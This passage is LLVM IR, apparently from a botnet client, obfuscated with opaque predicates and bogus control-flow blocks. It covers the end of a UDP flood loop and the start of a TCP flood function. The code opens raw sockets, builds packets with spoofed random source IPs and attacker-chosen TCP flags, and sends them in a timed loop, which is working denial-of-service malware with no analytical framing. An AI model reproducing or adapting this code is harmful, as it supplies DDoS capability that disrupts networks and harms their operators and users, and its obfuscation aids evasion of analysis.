  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 2
  %424 = load i16, i16* %423, align 2
  %425 = zext i16 %424 to i32
  %426 = call zeroext i16 @csum(i16* %421, i32 %425)
  %427 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 7
  store i16 %426, i16* %428, align 2
  %429 = call i64 @time(i64* null) #3
  %430 = load i32, i32* %11, align 4
  %431 = sext i32 %430 to i64
  %432 = add nsw i64 %429, %431
  %433 = trunc i64 %432 to i32
  store i32 %433, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  %434 = load i32, i32* @x.97
  %435 = load i32, i32* @y.98
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBBpart282, label %originalBB76alteredBB

originalBBpart282:                                ; preds = %originalBB76
  br label %442

; <label>:442:                                    ; preds = %538, %534, %527, %originalBBpart282
  br label %443

; <label>:443:                                    ; preds = %442
  %444 = load i32, i32* %24, align 4
  %445 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %446 = call i64 @sendto(i32 %444, i8* %325, i64 %323, i32 0, %struct.sockaddr* %445, i32 16)
  %447 = call i32 @rand_cmwc()
  %448 = trunc i32 %447 to i16
  %449 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %450 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %449, i32 0, i32 0
  %451 = bitcast %union.anon.1* %450 to %struct.anon.2*
  %452 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %451, i32 0, i32 0
  store i16 %448, i16* %452, align 2
  %453 = load i32, i32* %10, align 4
  %454 = icmp eq i32 %453, 0
  br i1 %454, label %455, label %457

; <label>:455:                                    ; preds = %443
  %456 = call i32 @rand_cmwc()
  br label %462

; <label>:457:                                    ; preds = %443
  %458 = load i32, i32* %10, align 4
  %459 = trunc i32 %458 to i16
  %460 = call zeroext i16 @htons(i16 zeroext %459) #10
  %461 = zext i16 %460 to i32
  br label %462

; <label>:462:                                    ; preds = %457, %455
  %463 = phi i32 [ %456, %455 ], [ %461, %457 ]
  %464 = load i32, i32* @x.97
  %465 = load i32, i32* @y.98
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %462
  %472 = trunc i32 %463 to i16
  %473 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %474 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %473, i32 0, i32 0
  %475 = bitcast %union.anon.1* %474 to %struct.anon.2*
  %476 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %475, i32 0, i32 1
  store i16 %472, i16* %476, align 2
  %477 = call i32 @rand_cmwc()
  %478 = trunc i32 %477 to i16
  %479 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 3
  store i16 %478, i16* %480, align 4
  %481 = load i32, i32* %27, align 4
  %482 = call i32 @GRIP(i32 %481)
  %483 = call i32 @htonl(i32 %482) #10
  %484 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 8
  store i32 %483, i32* %485, align 4
  %486 = bitcast i8* %325 to i16*
  %487 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 2
  %489 = load i16, i16* %488, align 2
  %490 = zext i16 %489 to i32
  %491 = call zeroext i16 @csum(i16* %486, i32 %490)
  %492 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 7
  store i16 %491, i16* %493, align 2
  %494 = load i32, i32* %32, align 4
  %495 = load i32, i32* %18, align 4
  %496 = icmp eq i32 %494, %495
  %497 = load i32, i32* @x.97
  %498 = load i32, i32* @y.98
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %496, label %505, label %528

; <label>:505:                                    ; preds = %originalBBpart286
  %506 = load i32, i32* @x.97
  %507 = load i32, i32* @y.98
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %505
  %514 = call i64 @time(i64* null) #3
  %515 = load i32, i32* %31, align 4
  %516 = sext i32 %515 to i64
  %517 = icmp sgt i64 %514, %516
  %518 = load i32, i32* @x.97
  %519 = load i32, i32* @y.98
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %517, label %526, label %527

; <label>:526:                                    ; preds = %originalBBpart290
  br label %541

; <label>:527:                                    ; preds = %originalBBpart290
  store i32 0, i32* %32, align 4
  br label %442

; <label>:528:                                    ; preds = %originalBBpart286
  %529 = load i32, i32* %32, align 4
  %530 = add i32 %529, 1
  store i32 %530, i32* %32, align 4
  %531 = load i32, i32* %33, align 4
  %532 = load i32, i32* %15, align 4
  %533 = icmp eq i32 %531, %532
  br i1 %533, label %534, label %538

; <label>:534:                                    ; preds = %528
  %535 = load i32, i32* %16, align 4
  %536 = mul nsw i32 %535, 1000
  %537 = call i32 @usleep(i32 %536)
  store i32 0, i32* %33, align 4
  br label %442

; <label>:538:                                    ; preds = %528
  %539 = load i32, i32* %33, align 4
  %540 = add i32 %539, 1
  store i32 %540, i32* %33, align 4
  br label %442

; <label>:541:                                    ; preds = %526
  %542 = load i32, i32* @x.97
  %543 = load i32, i32* @y.98
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %541
  %550 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %550)
  %551 = load i32, i32* @x.97
  %552 = load i32, i32* @y.98
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %559

; <label>:559:                                    ; preds = %originalBBpart294, %247, %239, %234, %120, %94, %83
  %560 = load i32, i32* @x.97
  %561 = load i32, i32* @y.98
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %559
  %568 = load i32, i32* @x.97
  %569 = load i32, i32* @y.98
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %41
  %576 = load i32, i32* %10, align 4
  %577 = trunc i32 %576 to i16
  %578 = call zeroext i16 @htons(i16 zeroext %577) #10
  %579 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %578, i16* %579, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  %580 = load i8*, i8** %9, align 8
  %581 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %582 = call i32 @getHost(i8* %580, %struct.in_addr* %581)
  %583 = icmp ne i32 %582, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  %584 = load i32, i32* %13, align 4
  %_ = sub i32 %584, 1
  %gen = mul i32 %_, 1
  %585 = add nsw i32 %584, 1
  %586 = sext i32 %585 to i64
  %587 = call noalias i8* @malloc(i64 %586) #3
  store i8* %587, i8** %20, align 8
  %588 = load i8*, i8** %20, align 8
  %589 = icmp eq i8* %588, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %150
  %590 = call i64 @time(i64* null) #3
  %591 = load i32, i32* %21, align 4
  %592 = sext i32 %591 to i64
  %593 = icmp sgt i64 %590, %592
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %171
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %189
  %594 = load i32, i32* %22, align 4
  %_19 = sub i32 0, %594
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 0, %594
  %gen22 = add i32 %_21, 1
  %_23 = sub i32 %594, 1
  %gen24 = mul i32 %_23, 1
  %_25 = shl i32 %594, 1
  %595 = add i32 %594, 1
  store i32 %595, i32* %22, align 4
  %596 = load i32, i32* %23, align 4
  %597 = load i32, i32* %15, align 4
  %598 = icmp eq i32 %596, %597
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %211
  %599 = load i32, i32* %16, align 4
  %_30 = shl i32 %599, 1000
  %_31 = sub i32 %599, 1000
  %gen32 = mul i32 %_31, 1000
  %_33 = shl i32 %599, 1000
  %_34 = sub i32 0, %599
  %gen35 = add i32 %_34, 1000
  %600 = mul nsw i32 %599, 1000
  %601 = call i32 @usleep(i32 %600)
  store i32 0, i32* %23, align 4
  br label %originalBB29

originalBB39alteredBB:                            ; preds = %originalBB39, %262
  %602 = load i32, i32* %12, align 4
  %603 = icmp eq i32 %602, 0
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %281
  store i32 0, i32* %27, align 4
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %298
  %604 = load i32, i32* %12, align 4
  %_48 = shl i32 32, %604
  %605 = sub nsw i32 32, %604
  %606 = shl i32 1, %605
  %_49 = sub i32 %606, 1
  %gen50 = mul i32 %_49, 1
  %_51 = sub i32 %606, 1
  %gen52 = mul i32 %_51, 1
  %_53 = sub i32 0, %606
  %gen54 = add i32 %_53, 1
  %_55 = shl i32 %606, 1
  %_56 = sub i32 %606, 1
  %gen57 = mul i32 %_56, 1
  %_58 = sub i32 %606, 1
  %gen59 = mul i32 %_58, 1
  %_60 = sub i32 0, %606
  %gen61 = add i32 %_60, 1
  %607 = sub nsw i32 %606, 1
  %_62 = sub i32 0, %607
  %gen63 = add i32 %_62, -1
  %_64 = shl i32 %607, -1
  %608 = xor i32 %607, -1
  store i32 %608, i32* %27, align 4
  br label %originalBB47

originalBB68alteredBB:                            ; preds = %originalBB68, %359
  %609 = call i32 @rand_cmwc()
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %377
  %610 = load i32, i32* %10, align 4
  %611 = trunc i32 %610 to i16
  %612 = call zeroext i16 @htons(i16 zeroext %611) #10
  %613 = zext i16 %612 to i32
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %398
  %614 = trunc i32 %399 to i16
  %615 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %616 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %615, i32 0, i32 0
  %617 = bitcast %union.anon.1* %616 to %struct.anon.2*
  %618 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %617, i32 0, i32 1
  store i16 %614, i16* %618, align 2
  %619 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %620 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %619, i32 0, i32 0
  %621 = bitcast %union.anon.1* %620 to %struct.anon.2*
  %622 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %621, i32 0, i32 3
  store i16 0, i16* %622, align 2
  %623 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %624 = bitcast %struct.udphdr* %623 to i8*
  %625 = getelementptr inbounds i8, i8* %624, i64 8
  %626 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %625, i32 %626)
  %627 = bitcast i8* %325 to i16*
  %628 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %629 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %628, i32 0, i32 2
  %630 = load i16, i16* %629, align 2
  %631 = zext i16 %630 to i32
  %632 = call zeroext i16 @csum(i16* %627, i32 %631)
  %633 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %634 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %633, i32 0, i32 7
  store i16 %632, i16* %634, align 2
  %635 = call i64 @time(i64* null) #3
  %636 = load i32, i32* %11, align 4
  %637 = sext i32 %636 to i64
  %_77 = shl i64 %635, %637
  %_78 = sub i64 0, %635
  %gen79 = add i64 %_78, %637
  %_80 = shl i64 %635, %637
  %638 = add nsw i64 %635, %637
  %639 = trunc i64 %638 to i32
  store i32 %639, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %originalBB76

originalBB84alteredBB:                            ; preds = %originalBB84, %462
  %640 = trunc i32 %463 to i16
  %641 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %642 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %641, i32 0, i32 0
  %643 = bitcast %union.anon.1* %642 to %struct.anon.2*
  %644 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %643, i32 0, i32 1
  store i16 %640, i16* %644, align 2
  %645 = call i32 @rand_cmwc()
  %646 = trunc i32 %645 to i16
  %647 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %648 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %647, i32 0, i32 3
  store i16 %646, i16* %648, align 4
  %649 = load i32, i32* %27, align 4
  %650 = call i32 @GRIP(i32 %649)
  %651 = call i32 @htonl(i32 %650) #10
  %652 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %653 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %652, i32 0, i32 8
  store i32 %651, i32* %653, align 4
  %654 = bitcast i8* %325 to i16*
  %655 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %656 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %655, i32 0, i32 2
  %657 = load i16, i16* %656, align 2
  %658 = zext i16 %657 to i32
  %659 = call zeroext i16 @csum(i16* %654, i32 %658)
  %660 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %661 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %660, i32 0, i32 7
  store i16 %659, i16* %661, align 2
  %662 = load i32, i32* %32, align 4
  %663 = load i32, i32* %18, align 4
  %664 = icmp eq i32 %662, %663
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %505
  %665 = call i64 @time(i64* null) #3
  %666 = load i32, i32* %31, align 4
  %667 = sext i32 %666 to i64
  %668 = icmp sgt i64 %665, %667
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %541
  %669 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %669)
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %559
  br label %originalBB96
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i32 @usleep(i32) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %55

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* @x.99
  %36 = load i32, i32* @y.100
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %9, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #10
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i32, i32* @x.99
  %48 = load i32, i32* @y.100
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %55

; <label>:55:                                     ; preds = %originalBBpart2, %30
  %56 = load i32, i32* @x.99
  %57 = load i32, i32* @y.100
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i8*, i8** %8, align 8
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %66 = call i32 @getHost(i8* %64, %struct.in_addr* %65)
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.99
  %69 = load i32, i32* @y.100
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %67, label %76, label %77

; <label>:76:                                     ; preds = %originalBBpart24
  br label %582

; <label>:77:                                     ; preds = %originalBBpart24
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %79 = getelementptr inbounds [8 x i8], [8 x i8]* %78, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 8, i32 4, i1 false)
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %80, i32* %17, align 4
  %81 = load i32, i32* %17, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %86, label %83

; <label>:83:                                     ; preds = %77
  %84 = load i32, i32* @switchCommStock, align 4
  %85 = call i32 (i32, i8*, ...) @botnetPrint(i32 %84, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i32 0, i32 0))
  br label %582

; <label>:86:                                     ; preds = %77
  %87 = load i32, i32* @x.99
  %88 = load i32, i32* @y.100
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  store i32 1, i32* %18, align 4
  %95 = load i32, i32* %17, align 4
  %96 = bitcast i32* %18 to i8*
  %97 = call i32 @setsockopt(i32 %95, i32 0, i32 3, i8* %96, i32 4) #3
  %98 = icmp slt i32 %97, 0
  %99 = load i32, i32* @x.99
  %100 = load i32, i32* @y.100
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %98, label %107, label %126

; <label>:107:                                    ; preds = %originalBBpart28
  %108 = load i32, i32* @x.99
  %109 = load i32, i32* @y.100
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = load i32, i32* @switchCommStock, align 4
  %117 = call i32 (i32, i8*, ...) @botnetPrint(i32 %116, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.115, i32 0, i32 0))
  %118 = load i32, i32* @x.99
  %119 = load i32, i32* @y.100
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %582

; <label>:126:                                    ; preds = %originalBBpart28
  %127 = load i32, i32* %11, align 4
  %128 = icmp eq i32 %127, 0
  br i1 %128, label %129, label %130

; <label>:129:                                    ; preds = %126
  store i32 0, i32* %19, align 4
  br label %136

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* %11, align 4
  %132 = sub nsw i32 32, %131
  %133 = shl i32 1, %132
  %134 = sub nsw i32 %133, 1
  %135 = xor i32 %134, -1
  store i32 %135, i32* %19, align 4
  br label %136

; <label>:136:                                    ; preds = %130, %129
  %137 = load i32, i32* %13, align 4
  %138 = sext i32 %137 to i64
  %139 = add i64 40, %138
  %140 = call i8* @llvm.stacksave()
  store i8* %140, i8** %20, align 8
  %141 = alloca i8, i64 %139, align 16
  %142 = bitcast i8* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %21, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = getelementptr i8, i8* %144, i64 20
  %146 = bitcast i8* %145 to %struct.tcphdr*
  store %struct.tcphdr* %146, %struct.tcphdr** %22, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %149 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %148, i32 0, i32 0
  %150 = load i32, i32* %149, align 4
  %151 = load i32, i32* %19, align 4
  %152 = call i32 @GRIP(i32 %151)
  %153 = call i32 @htonl(i32 %152) #10
  %154 = load i32, i32* %13, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 20, %155
  %157 = trunc i64 %156 to i32
  call void @makeIPPacket(%struct.iphdr* %147, i32 %150, i32 %153, i8 zeroext 6, i32 %157)
  %158 = call i32 @rand_cmwc()
  %159 = trunc i32 %158 to i16
  %160 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon* %161 to %struct.anon.0*
  %163 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %162, i32 0, i32 0
  store i16 %159, i16* %163, align 4
  %164 = call i32 @rand_cmwc()
  %165 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %166 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %165, i32 0, i32 0
  %167 = bitcast %union.anon* %166 to %struct.anon.0*
  %168 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %167, i32 0, i32 2
  store i32 %164, i32* %168, align 4
  %169 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon* %170 to %struct.anon.0*
  %172 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %171, i32 0, i32 3
  store i32 0, i32* %172, align 4
  %173 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon* %174 to %struct.anon.0*
  %176 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %175, i32 0, i32 4
  %177 = load i16, i16* %176, align 4
  %178 = and i16 %177, -241
  %179 = or i16 %178, 80
  store i16 %179, i16* %176, align 4
  %180 = load i8*, i8** %12, align 8
  %181 = call i32 @strcmp(i8* %180, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.116, i32 0, i32 0)) #9
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %219, label %183

; <label>:183:                                    ; preds = %136
  %184 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon* %185 to %struct.anon.0*
  %187 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %186, i32 0, i32 4
  %188 = load i16, i16* %187, align 4
  %189 = and i16 %188, -513
  %190 = or i16 %189, 512
  store i16 %190, i16* %187, align 4
  %191 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon* %192 to %struct.anon.0*
  %194 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -1025
  %197 = or i16 %196, 1024
  store i16 %197, i16* %194, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon* %199 to %struct.anon.0*
  %201 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -257
  %204 = or i16 %203, 256
  store i16 %204, i16* %201, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon* %206 to %struct.anon.0*
  %208 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %209, -4097
  %211 = or i16 %210, 4096
  store i16 %211, i16* %208, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 0
  %214 = bitcast %union.anon* %213 to %struct.anon.0*
  %215 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = and i16 %216, -2049
  %218 = or i16 %217, 2048
  store i16 %218, i16* %215, align 4
  br label %440

; <label>:219:                                    ; preds = %136
  %220 = load i8*, i8** %12, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %221, i8** %23, align 8
  br label %222

; <label>:222:                                    ; preds = %originalBBpart296, %219
  %223 = load i8*, i8** %23, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %439

; <label>:225:                                    ; preds = %222
  %226 = load i32, i32* @x.99
  %227 = load i32, i32* @y.100
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %225
  %234 = load i8*, i8** %23, align 8
